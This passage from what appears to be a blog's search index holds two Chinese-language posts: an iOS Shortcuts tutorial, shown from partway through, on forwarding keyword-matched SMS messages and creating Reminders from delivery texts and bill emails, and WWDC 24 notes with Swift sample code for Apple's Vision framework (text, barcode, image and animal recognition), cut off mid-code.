「傳送訊息」 或 「發送電子郵件」 的動作(如第三張圖)，將收到的訊息內容轉發到簡訊(如果沒開 iCloud 訊息可能會被收取簡訊費用)或 Email。新增傳送對象後 先點擊 將「訊息」傳送給「XXX」 ，的 「訊息」 輸入匡 向右滑找到＆點擊 「捷徑輸入」 回到上方點擊 將 「捷徑輸入」傳送給「XXX」 ，的 「捷徑輸入」 輸入匡 跳出下方選單，將原本選擇的 「訊息」 改為 「內容」 點擊選單旁邊「X」關閉 點擊右上角「完成」 如果要更改傳送給 XXX 對象，要先點右邊 X 移除整個 Line 動作，然後再重新新增一次 Line 傳送訊息動作 with 新對象。 確認最終設定結果是：當我收到包含「XXX」的訊息時，將訊息作為輸入接收，Line 將「內容」傳送給「XXX」 沒問題點擊右上角「完成」如果點完成沒反應那可能是遇到 iOS Bug，可以不管他直接點返回回到首頁。 回到捷徑自動化首頁可以查看、暫停、修改這則捷徑。完成！只要坐等新簡訊進來，符合包含的關鍵字就會自動轉發(就算手機沒解鎖)，礙於目前功能限制，每個關鍵字都要建立一個捷徑，同個簡訊包含到不同關鍵字會發送兩次。場景 2 — 包裹送達超商時-自動建立提醒待辦事項我目前使用 Apple 內建的提醒事項當做生活事項的待辦管理工具，所以我也希望那些需要提醒我的事也能整合進去，例如包裹送達超商、信用卡繳費通知…等等效果設定條件如下： 當收到簡訊包含「已在」時新增提醒事項 (Coupang 是用「已在」) 當收到簡訊包含「送達」時新增提醒事項 (一般都是「送達」)設定方式1.安裝＆ 打開 捷徑 App2.切換到「自動化」頁籤，選擇右上角「+」，下滑找到「訊息」3. 設定訊息條件同前文自動轉發簡訊介紹的何時條件，這邊設定 訊息內容包含「送達」 和改成 「立即執行」 。4. 新增自動化操作 ＆ 設定提醒時間首先我們要先設定提醒事項的到期日，新增一個日期變數，計算當收到訊息的時間開始 + 多少時間等於我們要的提醒時間。 選擇 「新增空白的自動化操作」 下方搜尋匡搜尋 「調整日期」 選擇 「調整日期」 選擇 將「日期」加上 0 秒 的 「日期」 輸入匡 下方選取變數，選擇 「目前的日期」 選擇 加上 0 「秒」 ，的 「秒」 輸入匡，改成 「天」 輸入你希望多久到期提醒的天數，這邊我輸入 3 天 點擊選單旁邊「X」關閉5. 新增提醒事項動作 在搜尋匡輸入 「提醒」 下滑找到＆點擊 「新增提醒事項」新增「新增提醒事項」後 先點擊 將「提醒事項」加入「提醒事項」並不提示 ，的第一個 「提醒事項」 輸入匡 向右滑找到＆點擊 「捷徑輸入」 點擊 將「捷徑輸入」加入「提醒事項」並不提示 ，的 「捷徑輸入」 輸入匡 跳出下方選單，將原本選擇的 「訊息」 改為 「內容」 點擊選單旁邊「X」關閉6. 設定提示提醒 將 「不提示」 改選擇 「提示」 選擇 於時間「下午 2:00」 的 「下午 2:00」 輸入匡，選擇變數 「已調整日期」 點擊選單旁邊「X」關閉 都沒問題後點擊右上角「完成」如果點完成沒反應那可能是遇到 iOS Bug，可以不管他直接點返回回到首頁。 回到捷徑自動化首頁可以查看、暫停、修改這則捷徑。完成！同前述，只要坐等新簡訊進來，符合包含的關鍵字就會自動建立提醒事項(就算手機沒解鎖)，礙於目前功能限制，每個關鍵字都要建立一個捷徑，同個簡訊包含到不同關鍵字會建立兩次。場景 3 — 收到信用卡帳單郵件時-自動建立提醒待辦事項另一個生活通知是信用卡帳單通知；設定類似簡訊，當收到電子郵件時也能觸發捷徑自動化新增提醒事項；但因目前自動化功能未開放給第三方 App，所以只能使用 Apple 郵件 App 觸發。效果設定條件如下： 當收到電子郵件標題包含「信用卡帳單」時新增提醒事項 請注意每家的格式都不一樣 Orz，有的叫「信用卡電子帳單」、「信用卡電子對帳單」國泰的更狠叫「信用卡XXXX年X月電子帳單」 因為暫時不支援 Regex 所以只能使用文字匹配，同前述 每個關鍵字都要新增一則捷徑。1.確認你已安裝 郵件 App 並完成信箱帳號登入 (Gmail 也可)2.確認郵件擷取設定確認「設定」-&gt;「郵件」-&gt;「帳號」-&gt;「擷取新資料」設定為擷取或推播。3.安裝＆ 打開 捷徑 App4.切換到「自動化」頁籤，選擇右上角「+」，下滑找到「電子郵件」3. 設定電子郵件條件 「標題包含」： 信用卡帳單 多個關鍵字要個別建立多個捷徑。 「確認後執行」改成 立即執行 點擊「下一步」何時 — 其他設定： 「寄件人」：多個，但要加入到聯絡人 其他過濾條件 — 帳號：可篩選來源是 iCloud or Gmail 其他過濾條件 — 收件人：多個，但要加入到聯絡人，一般就是自己的多個帳號4. 新增自動化操作 ＆ 設定提醒時間先設定提醒事項的到期日，新增一個日期變數，計算當收到訊息的時間開始 + 多少時間等於我們要的提醒時間。 選擇 「新增空白的自動化操作」 下方搜尋匡搜尋 「調整日期」 選擇 「調整日期」 選擇 將「日期」加上 0 秒 的 「日期」 輸入匡 下方選取變數，選擇 「目前的日期」 加上 0「秒」 的 「秒」 改成 「天」 輸入你希望多久到期提醒的天數，這邊我輸入 3 天 點擊選單旁邊「X」關閉5. 設定過濾信件跟訊息一則一則觸發不一樣，郵件的觸發是批次擷取，因此只要那批次有出現關鍵字標題的信件，那幾封新信件也會被一同送進來。 不確定是不是捷徑 Bug，但總之結果就是如此。舉例：批次擷取到三封信，有一封家樂福通知信、信用卡帳單信、Uber 通知信，這三封都會做為捷徑輸入給我們；因此我們要再加一個步驟過濾出我們要的關鍵字信件。虛擬邏輯：for 信件標題 in 信件s if 信件標題.contain(\"信用卡帳單\") then 新增提醒事項 else end end 在搜尋匡輸入 「重複」 下滑找到＆點擊 「重複每一個」 新增完會抓錯變數，選擇 重複「已調整日期」中的每個項目 的 「已調整日期」 輸入匡，選擇 「清除變數」 清除後，選擇 重複「項目」中的每個項目 的 「項目」 輸入匡，選擇 「捷徑輸入」 在搜尋匡輸入 「如果」 下滑找到＆點擊 「如果」 這時候位置會是錯的 拖曳 若「重複結果」「狀況」 動作到 重複「捷徑輸入」中的每個項目 下面(內) 確認最終位置圖如上圖二，如果不對請刪除重複跟如果並從上一步重新操作 點擊 若「重複結果」「狀況」 的 「重複結果」 輸入匡，下方改選擇 「標題」 ，點擊選單旁邊「X」關閉 點擊 若「標題」「狀況」 的 「標題」 輸入匡，改選擇 「包含」 ，輸入 「信用卡帳單」 ，點擊鍵盤的「完成」6. 設定過濾信件 在搜尋匡輸入「提醒」下滑找到＆點擊「新增提醒事項」 一樣這時候位置會是錯的 拖曳 將「提醒事項」加入「提醒事項」並「不提示」 動作到 若「標題」「包含」「信用卡帳單」 下面(內) 確認最終位置圖如上圖三，如果不對請刪除重複跟如果並從上一步重新操作新增「新增提醒事項」後 點擊 將「提醒事項」加入「提醒事項」並「不提示」 ，的第一個 「提醒事項」 輸入匡 向右滑找到＆點擊 「重複項目」 回到上方點擊 「重複項目」 輸入匡，將原本選擇的 「電子郵件」 改為 「標題」 點擊選單旁邊「X」關閉6. 設定提示提醒 將 「不提示」 改選擇 「提示」 選擇 於時間 下午 2:00 的 「下午 2:00」 輸入匡，選擇變數 「已調整日期」 點擊選單旁邊「X」關閉 沒問題點擊右上角「完成」如果點完成沒反應那可能是遇到 iOS Bug，可以不管他直接點返回回到首頁。 回到捷徑自動化首頁可以查看、暫停、修改這則捷徑。完成！郵件的設定相對較複雜一點，因為是批次擷取所以還需要再次篩選一次，然後把篩選結果建立提醒事項。 現在有新的郵件、Apple 郵件擷取完，裡面有信用卡帳單標題的話就會自動建立囉！ 因為 Apple 郵件是用擷取的 (非 iCloud 的話)，因此信件收取也不會是即時的，會延遲一陣子。其他捷徑自動化執行完會跳通知，這通知無法關閉。結束現在已完成了幾個基礎的自動化整合功能，簡單幾個步驟節省你日常的心力；其他進階串接，例如打 API 整合到 Notion 或更複雜的整合，技術上也都能達成， 缺的不是技術是你天馬行空的自動化想法！其他自動化延伸閱讀 使用 Google Apps Script 實現 Google 服務 RPA 自動化 運用 Google Apps Script 轉發 Gmail 信件到 Slack有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 8,986 Total Views Last Statistics Date: 2025-08-15 | 8,446 Views on Medium." }, { "title": "iOS Vision framework x WWDC 24 Discover Swift enhancements in the Vision framework Session", "url": "/posts/kkday-tech-blog/ios-vision-framework-x-wwdc-24-discover-swift-enhancements-in-the-vision-framework-session-755509180ca8/", "categories": "KKday Tech Blog", "tags": "ios-app-development, vision-framework, apple-intelligence, ai, machine-learning", "date": "2024-08-13 16:10:37 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.iOS Vision framework x WWDC 24 Discover Swift enhancements in the Vision framework SessionVision framework 功能回顧 &...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.iOS Vision framework x WWDC 24 Discover Swift enhancements in the Vision framework SessionVision framework 功能回顧 &amp; iOS 18 新 Swift API 試玩Photo by BoliviaInteligente主題跟 Vision Pro 的關係就跟熱狗跟狗的關係一樣，毫無關係。Vision frameworkVision framework 是 Apple 整合機器學習的圖像辨識框架，讓開發者可以簡單快速地實現常見的圖像辨識功能；Vision framework 早在 iOS 11.0+ (2017/ iPhone 8) 就已推出，期間不斷地迭代優化，並完善與 Swift Concurrency 的特性整合提升執行效能，並且從 iOS 18.0 提供全新的 Swift Vision framework API 發揮 Swift Concurrency 最大效果。Vision framework 特色 內建眾多圖片辨識、動態追蹤方法 (iOS 18 為止一共 31 種) On-Device 單純使用手機晶片運算，辨識過程不依賴雲端服務，快速又安全 API 簡單好操作 Apple 全平台均支援 iOS 11.0+, iPadOS 11.0+, Mac Catalyst 13.0+, macOS 10.13+, tvOS 11.0+, visionOS 1.0+ 已發布多年 (2017~今) 且不斷更新 整合 Swift 語言特性提升運算效能 6 年前曾經小玩過： Vision 初探 — APP 頭像上傳 自動識別人臉裁圖 (Swift) 這次搭配 WWDC 24 Discover Swift enhancements in the Vision framework Session 重新回顧並結合新的 Swfit 特性再玩一次。CoreMLApple 還有另外一個 Framework 叫 CoreML ，也是基於 On-Device 晶片的機器學習框架；但他可以讓你自己訓練想辨識的物件、文件模型，並將模型放到 App 中直接使用，有興趣的朋友也可以玩看看。(e.g. 即時文章分類 、即時 垃圾訊息檢測 …)p.s.Vision v.s. VisionKit ： Vision ：主要用於圖像分析任務，如臉部識別、條碼檢測、文本識別等。它提供了強大的 API 來處理和分析靜態圖像或視頻中的視覺內容。 VisionKit ：專門用於處理與文件掃描相關的任務。它提供了一個掃描儀視圖控制器，可以用來掃描文檔，並生成高質量的 PDF 或圖像。Vision framework 在 M1 機型上無法跑在模擬器，只能接實體手機測試；在模擬器環境執行會拋出 Could not create Espresso context Error，查 官方論壇討論，沒找到解答 。 因手邊沒有實體 iOS 18 裝置進行測試，所以本文中的所有執行結果都是使用舊的 (iOS 18 以前) 的寫法結果； 如新寫法有出現錯誤再麻煩留言指教 。WWDC 2024 — Discover Swift enhancements in the Vision frameworkDiscover Swift enhancements in the Vision framework 本文是針對 WWDC 24 — Discover Swift enhancements in the Vision framework Session 的分享筆記，跟一些自己實驗的心得。Introduction — Vision framework Features人臉辨識、輪廓識別圖像內容文字辨識截至 iOS 18 為止，支援 18 種語言。// 支援的語系列表if #available(iOS 18.0, *) { print(RecognizeTextRequest().supportedRecognitionLanguages.map { \"\\($0.languageCode!)-\\(($0.region?.identifier ?? $0.script?.identifier)!)\" })} else { print(try! VNRecognizeTextRequest().supportedRecognitionLanguages())}// 實際可用辨識語言以這為主。// 實測 iOS 18 輸出以下結果：// [\"en-US\", \"fr-FR\", \"it-IT\", \"de-DE\", \"es-ES\", \"pt-BR\", \"zh-Hans\", \"zh-Hant\", \"yue-Hans\", \"yue-Hant\", \"ko-KR\", \"ja-JP\", \"ru-RU\", \"uk-UA\", \"th-TH\", \"vi-VT\", \"ar-SA\", \"ars-SA\"]// 未看到 WWDC 提到的 Swedish 語言，不確定是還沒推出還是跟裝置地區、語系有關聯動態動作捕捉 可以實現人、物件動態捕捉 手勢補捉實現隔空簽名功能What’s new in Vision? (iOS 18)— 圖片評分功能 (品質、記憶點) 可對輸入圖片得計算出分數，方便篩選出優質照片 分數計算方式包含多個維度，不只是畫質，還有光線、角度、拍攝主體、 是否有讓人感到的記憶點 …等等WWDC 中給了以上三張圖片做說明(相同畫質之下)，分別是： 高分的圖片：取景、光線、有記憶點 低分的圖片：沒有主體、像是隨手或不小心拍的 素材的圖片：技術上拍的很好但是沒有記憶點，像是作為素材圖庫用的圖片iOS ≥ 18 New API: CalculateImageAestheticsScoresRequestlet request = CalculateImageAestheticsScoresRequest()let result = try await request.perform(on: URL(string: \"https://zhgchg.li/assets/cb65fd5ab770/1*yL3vI1ADzwlovctW5WQgJw.jpeg\")!)// 照片分數print(result.overallScore)// 是否被判定為素材圖片print(result.isUtility)What’s new in Vision? (iOS 18) — 身體＋手勢姿勢同時偵測以往只能個別偵測人體 Pose 和 手部 Pose，這次更新可以讓開發者同時偵測身體 Pose + 手部 Pose，合成同一個請求跟結果，方便我們做更多應用功能開發。iOS ≥ 18 New API: DetectHumanBodyPoseRequestvar request = DetectHumanBodyPoseRequest()// 一併偵測手部 Poserequest.detectsHands = trueguard let bodyPose = try await request.perform(on: image). first else { return }// 身體 Pose Jointslet bodyJoints = bodyPose.allJoints()// 左手 Pose Jointslet leftHandJoints = bodyPose.leftHand.allJoints()// 右手 Pose Jointslet rightHandJoints = bodyPose.rightHand.allJoints()New Vision APIApple 在這次的更新當中提供了新的 Swift Vision API 封裝給開發者使用，除了基本的包含原本的功能支援之外，主要針對加強 Swift 6 / Swift Concurrency 的特性，提供效能更優、寫起來更 Swift 的 API 操作方式。Get started with Vision這邊講者又重新介紹了一次 Vision framework 的基礎使用方式，Apple 已經封裝好了 31 種 (截至 iOS 18)常見的圖像辨識請求「Request」與對應回傳的「Observation」物件。 Request: DetectFaceRectanglesRequest 人臉區域識別請求Result: FaceObservation之前的文章「 Vision 初探 — APP 頭像上傳 自動識別人臉裁圖 (Swift) 」就是用這對請求。 Request: RecognizeTextRequest 文字辨識請求Result: RecognizedTextObservation Request: GenerateObjectnessBasedSaliencyImageRequest 主體物件辨識請求Result: SaliencyImageObservation全部 31 種請求 Request：VisionRequest 。 Request 用途 Observation 說明 CalculateImageAestheticsScoresRequest計算圖像的美學分數。 AestheticsObservation返回圖像的美學評分，如構圖、色彩等因素。 ClassifyImageRequest分類圖像內容。 ClassificationObservation返回圖像中物體或場景的分類標籤及置信度。 CoreMLRequest使用 Core ML 模型分析圖像。 CoreMLFeatureValueObservation根據 Core ML 模型的輸出結果生成觀察值。 DetectAnimalBodyPoseRequest檢測圖像中的動物姿勢。 RecognizedPointsObservation返回動物的骨架點及其位置。 DetectBarcodesRequest檢測圖像中的條碼。 BarcodeObservation返回條碼數據及類型（如 QR code）。 DetectContoursRequest檢測圖像中的輪廓。 ContoursObservation返回圖像中檢測到的輪廓線。 DetectDocumentSegmentationRequest檢測並分割圖像中的文件。 RectangleObservation返回文件邊界的矩形框位置。 DetectFaceCaptureQualityRequest評估面部捕捉質量。 FaceObservation返回面部圖像的質量評估分數。 DetectFaceLandmarksRequest檢測面部特徵點。 FaceObservation返回面部特徵點（如眼睛、鼻子等）的詳細位置。 DetectFaceRectanglesRequest檢測圖像中的面部。 FaceObservation返回人臉的邊界框位置。 DetectHorizonRequest檢測圖像中的地平線。 HorizonObservation返回地平線的角度和位置。 DetectHumanBodyPose3DRequest檢測圖像中的 3D 人體姿勢。 RecognizedPointsObservation返回 3D 人體骨架點及其空間坐標。 DetectHumanBodyPoseRequest檢測圖像中的人體姿勢。 RecognizedPointsObservation返回人體骨架點及其坐標。 DetectHumanHandPoseRequest檢測圖像中的手部姿勢。 RecognizedPointsObservation返回手部骨架點及其位置。 DetectHumanRectanglesRequest檢測圖像中的人體。 HumanObservation返回人體的邊界框位置。 DetectRectanglesRequest檢測圖像中的矩形。 RectangleObservation返回矩形的四個頂點坐標。 DetectTextRectanglesRequest檢測圖像中的文本區域。 TextObservation返回文本區域的位置和邊界框。 DetectTrajectoriesRequest檢測並分析物體運動軌跡。 TrajectoryObservation返回運動軌跡點及其時間序列。 GenerateAttentionBasedSaliencyImageRequest生成基於注意力的顯著性圖像。 SaliencyImageObservation返回圖像中最具吸引力區域的顯著性地圖。 GenerateForegroundInstanceMaskRequest生成前景實例掩膜圖像。 InstanceMaskObservation返回前景物體的掩膜。 GenerateImageFeaturePrintRequest生成圖像特徵指紋以進行比較。 FeaturePrintObservation返回圖像的特徵指紋數據，用於相似度比較。 GenerateObjectnessBasedSaliencyImageRequest生成基於物體顯著性的圖像。 SaliencyImageObservation返回物體顯著性區域的顯著性地圖。 GeneratePersonInstanceMaskRequest生成人物實例掩膜圖像。 InstanceMaskObservation返回人物實例的掩膜。 GeneratePersonSegmentationRequest生成人物分割圖像。 SegmentationObservation返回人物分割的二值圖。 RecognizeAnimalsRequest檢測並識別圖像中的動物。 RecognizedObjectObservation返回動物類型及其置信度。 RecognizeTextRequest檢測並識別圖像中的文本。 RecognizedTextObservation返回檢測到的文本內容及其區域位置。 TrackHomographicImageRegistrationRequest跟踪圖像的同位影像配準。 ImageAlignmentObservation返回圖像間的同位變換矩陣，用於影像配準。 TrackObjectRequest跟踪圖像中的物體。 DetectedObjectObservation返回物體在影像中的位置和速度信息。 TrackOpticalFlowRequest跟踪圖像中的光流。 OpticalFlowObservation返回光流矢量場，用於描述像素移動情況。 TrackRectangleRequest跟踪圖像中的矩形。 RectangleObservation返回矩形在影像中的位置、大小和旋轉角度。 TrackTranslationalImageRegistrationRequest跟踪圖像的平移影像配準。 ImageAlignmentObservation返回圖像間的平移變換矩陣，用於影像配準。 前面補上 VN 就是舊的 API 寫法 (iOS 18 以前的版本)講者提到了幾個常用的 Request，如下。ClassifyImageRequest辨識輸入的圖片，得到標籤分類與置信度。[遊記] 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境if #available(iOS 18.0, *) { // 新的使用 Swift 特性的 API let request = ClassifyImageRequest() Task { do { let observations = try await request.perform(on: URL(string: \"https://zhgchg.li/assets/cb65fd5ab770/1*yL3vI1ADzwlovctW5WQgJw.jpeg\")!) observations.forEach { observation in print(\"\\(observation.identifier): \\(observation.confidence)\") } } catch { print(\"Request failed: \\(error)\") } }} else { // 舊的寫法 let completionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNClassificationObservation] else { return } observations.forEach { observation in print(\"\\(observation.identifier): \\(observation.confidence)\") } } let request = VNClassifyImageRequest(completionHandler: completionHandler) DispatchQueue.global().async { let handler = VNImageRequestHandler(url: URL(string: \"https://zhgchg.li/assets/cb65fd5ab770/1*3_jdrLurFuUfNdW4BJaRww.jpeg\")!, options: [:]) do { try handler.perform([request]) } catch { print(\"Request failed: \\(error)\") } }}分析結果： • outdoor（戶外）: 0.75392926 • sky（天空）: 0.75392926 • blue_sky（藍天）: 0.7519531 • machine（機器）: 0.6958008 • cloudy（多雲）: 0.26538086 • structure（結構）: 0.15728651 • sign（標誌）: 0.14224191 • fence（柵欄）: 0.118652344 • banner（橫幅）: 0.0793457 • material（材料）: 0.075975396 • plant（植物）: 0.054406323 • foliage（樹葉）: 0.05029297 • light（光）: 0.048126098 • lamppost（燈柱）: 0.048095703 • billboards（廣告牌）: 0.040039062 • art（藝術）: 0.03977703 • branch（樹枝）: 0.03930664 • decoration（裝飾）: 0.036868922 • flag（旗幟）: 0.036865234....略RecognizeTextRequest辨識圖片中的文字內容。(a.k.a 圖片轉文字)[遊記] 2023 東京 5 日自由行if #available(iOS 18.0, *) { // 新的使用 Swift 特性的 API var request = RecognizeTextRequest() request.recognitionLevel = .accurate request.recognitionLanguages = [.init(identifier: \"ja-JP\"), .init(identifier: \"en-US\")] // Specify language code, e.g., Traditional Chinese Task { do { let observations = try await request.perform(on: URL(string: \"https://zhgchg.li/assets/9da2c51fa4f2/1*fBbNbDepYioQ-3-0XUkF6Q.jpeg\")!) observations.forEach { observation in let topCandidate = observation.topCandidates(1).first print(topCandidate?.string ?? \"No text recognized\") } } catch { print(\"Request failed: \\(error)\") } }} else { // 舊的寫法 let completionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNRecognizedTextObservation] else { return } observations.forEach { observation in let topCandidate = observation.topCandidates(1).first print(topCandidate?.string ?? \"No text recognized\") } } let request = VNRecognizeTextRequest(completionHandler: completionHandler) request.recognitionLevel = .accurate request.recognitionLanguages = [\"ja-JP\", \"en-US\"] // Specify language code, e.g., Traditional Chinese DispatchQueue.global().async { let handler = VNImageRequestHandler(url: URL(string: \"https://zhgchg.li/assets/9da2c51fa4f2/1*fBbNbDepYioQ-3-0XUkF6Q.jpeg\")!, options: [:]) do { try handler.perform([request]) } catch { print(\"Request failed: \\(error)\") } }}分析結果：LE LABO 青山店TEL:03-6419-7167＊お買い上げありがとうございます*No: 21347日付：2023/06/10 14.14.57担当：1690370レジ：008A 1商品名税込上代数量税込合計カイアック 10 EDP FB 15MLJ1P7010000S16,80016,800アナザー 13 EDP FB 15MLJ1PJ010000S10,70010,700リップパーム 15MLJOWC010000S2,0001合計金額（内税額）CARD2,0003点御買上げ29,500029,50029,500DetectBarcodesRequest偵測圖片中的條碼、QRCode 數據。泰國當地人推薦鵝牌清涼膏let filePath = Bundle.main.path(forResource: \"IMG_6777\", ofType: \"png\")! // 本地測試圖片let fileURL = URL(filePath: filePath)if #available(iOS 18.0, *) { // 新的使用 Swift 特性的 API let request = DetectBarcodesRequest() Task { do { let observations = try await request.perform(on: fileURL) observations.forEach { observation in print(\"Payload: \\(observation.payloadString ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology)\") } } catch { print(\"Request failed: \\(error)\") } }} else { // 舊的寫法 let completionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNBarcodeObservation] else { return } observations.forEach { observation in print(\"Payload: \\(observation.payloadStringValue ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology.rawValue)\") } } let request = VNDetectBarcodesRequest(completionHandler: completionHandler) DispatchQueue.global().async { let handler = VNImageRequestHandler(url: fileURL, options: [:]) do { try handler.perform([request]) } catch { print(\"Request failed: \\(error)\") } }}分析結果：Payload: 8859126000911Symbology: VNBarcodeSymbologyEAN13Payload: https://lin.ee/hGynbVMSymbology: VNBarcodeSymbologyQRPayload: http://www.hongthaipanich.com/Symbology: VNBarcodeSymbologyQRPayload: https://www.facebook.com/qr?id=100063856061714Symbology: VNBarcodeSymbologyQRRecognizeAnimalsRequest辨識圖片中的動物與置信度。meme Sourcelet filePath = Bundle.main.path(forResource: \"IMG_5026\", ofType: \"png\")! // 本地測試圖片let fileURL = URL(filePath: filePath)if #available(iOS 18.0, *) { // 新的使用 Swift 特性的 API let request = RecognizeAnimalsRequest() Task { do { let observations = try await request.perform(on: fileURL) observations.forEach { observation in let labels = observation.labels labels.forEach { label in print(\"Detected animal: \\(label.identifier) with confidence: \\(label.confidence)\") } } } catch { print(\"Request failed: \\(error)\") } }} else { // 舊的寫法 let completionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNRecognizedObjectObservation] else { return } observations.forEach { observation in let labels = observation.labels labels.forEach { label in print(\"Detected animal: \\(label.identifier) with confidence: \\(label.confidence)\") } } } let request = VNRecognizeAnimalsRequest(completionHandler: completionHandler) DispatchQueue.global().async { let handler = VNImageRequestHandler(url: fileURL, options: [:]) do { try handler.perform([request]) } catch { print(\"Request failed: \\(error)\") } }}分析結果：Detected animal: Cat with confidence: 0.77245045其他： 偵測圖像中的人體：DetectHumanRectanglesRequest 偵測人、動物的 Pose 動作 (3D or 2D 都可以)：DetectAnimalBodyPoseRequest、DetectHumanBodyPose3DRequest、DetectHumanBodyPoseRequest、DetectHumanHandPoseRequest 檢測並追蹤物件的運動軌跡(在影片、動畫不同的偵中)：DetectTrajectoriesRequest、TrackObjectRequest、TrackRectangleRequestiOS ≥ 18 Update Highlight:VN*Request -&gt; *Request (e.g. VNDetectBarcodesRequest -&gt; DetectBarcodesRequest)VN*Observation -&gt; *Observation (e.g. VNRecognizedObjectObservation -&gt; RecognizedObjectObservation)VNRequestCompletionHandler -&gt; async/awaitVNImageRequestHandler.perform([VN*Request]) -&gt; *Request.perform()WWDC ExampleWWDC 官方影片以超市商品掃描器為例。首先大多數的商品都有 Barcode 可供掃描我們可以從 observation.boundingBox 取得 Barcode 所在位置，但不同於常見 UIView 座標系， BoundingBox 的相對位置起點是從左下角，值的範圍落在 0~1 之間。let filePath = Bundle.main.path(forResource: \"IMG_6785\", ofType: \"png\")! // 本地測試圖片let fileURL = URL(filePath: filePath)if #available(iOS 18.0, *) { // 新的使用 Swift 特性的 API var request = DetectBarcodesRequest() request.symbologies = [.ean13] // 如果只要掃描 EAN13 Barcode，可直接指定，提升效能 Task { do { let observations = try await request.perform(on: fileURL) if let observation = observations.first { DispatchQueue.main.async { self.infoLabel.text = observation.payloadString // 標記顏色 Layer let colorLayer = CALayer() // iOS &gt;=18 新的座標轉換 API toImageCoordinates // 未經測試，實際可能還需要計算 ContentMode = AspectFit 的位移: colorLayer.frame = observation.boundingBox.toImageCoordinates(self.baseImageView.frame.size, origin: .upperLeft) colorLayer.backgroundColor = UIColor.red.withAlphaComponent(0.5).cgColor self.baseImageView.layer.addSublayer(colorLayer) } print(\"BoundingBox: \\(observation.boundingBox.cgRect)\") print(\"Payload: \\(observation.payloadString ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology)\") } } catch { print(\"Request failed: \\(error)\") } }} else { // 舊的寫法 let completionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNBarcodeObservation] else { return } if let observation = observations.first { DispatchQueue.main.async { self.infoLabel.text = observation.payloadStringValue // 標記顏色 Layer let colorLayer = CALayer() colorLayer.frame = self.convertBoundingBox(observation.boundingBox, to: self.baseImageView) colorLayer.backgroundColor = UIColor.red.withAlphaComponent(0.5).cgColor self.baseImageView.layer.addSublayer(colorLayer) } print(\"BoundingBox: \\(observation.boundingBox)\") print(\"Payload: \\(observation.payloadStringValue ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology.rawValue)\") } } let request = VNDetectBarcodesRequest(completionHandler: completionHandler) request.symbologies = [.ean13] // 如果只要掃描 EAN13 Barcode，可直接指定，提升效能 DispatchQueue.global().async { let handler = VNImageRequestHandler(url: fileURL, options: [:]) do { try handler.perform([request]) } catch { print(\"Request failed: \\(error)\") } }}iOS ≥ 18 Update Highlight:// iOS &gt;=18 新的座標轉換 API toImageCoordinatesobservation.boundingBox.toImageCoordinates(CGSize, origin: .upperLeft)// https://developer.apple.com/documentation/vision/normalizedpoint/toimagecoordinates(from:imagesize:origin:)Helper:// Gen by ChatGPT 4o// 因為照片在 ImageView 是設定 ContentMode = AspectFit// 所以要多計算上下因 Fit 造成的空白位移func convertBoundingBox(_ boundingBox: CGRect, to view: UIImageView) -&gt; CGRect { guard let image = view.image else { return .zero } let imageSize = image.size let viewSize = view.bounds.size let imageRatio = imageSize.width / imageSize.height let viewRatio = viewSize.width / viewSize.height var scaleFactor: CGFloat var offsetX: CGFloat = 0 var offsetY: CGFloat = 0 if imageRatio &gt; viewRatio { // 圖像在寬度方向上適配 scaleFactor = viewSize.width / imageSize.width offsetY = (viewSize.height - imageSize.height * scaleFactor) / 2 } else { // 圖像在高度方向上適配 scaleFactor = viewSize.height / imageSize.height offsetX = (viewSize.width - imageSize.width * scaleFactor) / 2 } let x = boundingBox.minX * imageSize.width * scaleFactor + offsetX let y = (1 - boundingBox.maxY) * imageSize.height * scaleFactor + offsetY let width = boundingBox.width * imageSize.width * scaleFactor let height = boundingBox.height * imageSize.height * scaleFactor return CGRect(x: x, y: y, width: width, height: height)}輸出結果BoundingBox: (0.5295758928571429, 0.21408638121589782, 0.0943080357142857, 0.21254415360708087)Payload: 4710018183805Symbology: VNBarcodeSymbologyEAN13部分商品無 Barcode，如散裝水果只有商品標籤因此我們的掃瞄器也需要同時支援掃描純文字標籤。let filePath = Bundle.main.path(forResource: \"apple\", ofType: \"jpg\")! // 本地測試圖片let fileURL = URL(filePath: filePath)if #available(iOS 18.0, *) { // 新的使用 Swift 特性的 API var barcodesRequest = DetectBarcodesRequest() barcodesRequest.symbologies = [.ean13] // 如果只要掃描 EAN13 Barcode，可直接指定，提升效能 var textRequest = RecognizeTextRequest() textRequest.recognitionLanguages = [.init(identifier: \"zh-Hnat\"), .init(identifier: \"en-US\")] Task { do { let handler = ImageRequestHandler(fileURL) // parameter pack syntax and we must wait for all requests to finish before we can use their results. // let (barcodesObservation, textObservation, ...) = try await handler.perform(barcodesRequest, textRequest, ...) let (barcodesObservation, textObservation) = try await handler.perform(barcodesRequest, textRequest) if let observation = barcodesObservation.first { DispatchQueue.main.async { self.infoLabel.text = observation.payloadString // 標記顏色 Layer let colorLayer = CALayer() // iOS &gt;=18 新的座標轉換 API toImageCoordinates // 未經測試，實際可能還需要計算 ContentMode = AspectFit 的位移: colorLayer.frame = observation.boundingBox.toImageCoordinates(self.baseImageView.frame.size, origin: .upperLeft) colorLayer.backgroundColor = UIColor.red.withAlphaComponent(0.5).cgColor self.baseImageView.layer.addSublayer(colorLayer) } print(\"BoundingBox: \\(observation.boundingBox.cgRect)\") print(\"Payload: \\(observation.payloadString ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology)\") } textObservation.forEach { observation in let topCandidate = observation.topCandidates(1).first print(topCandidate?.string ?? \"No text 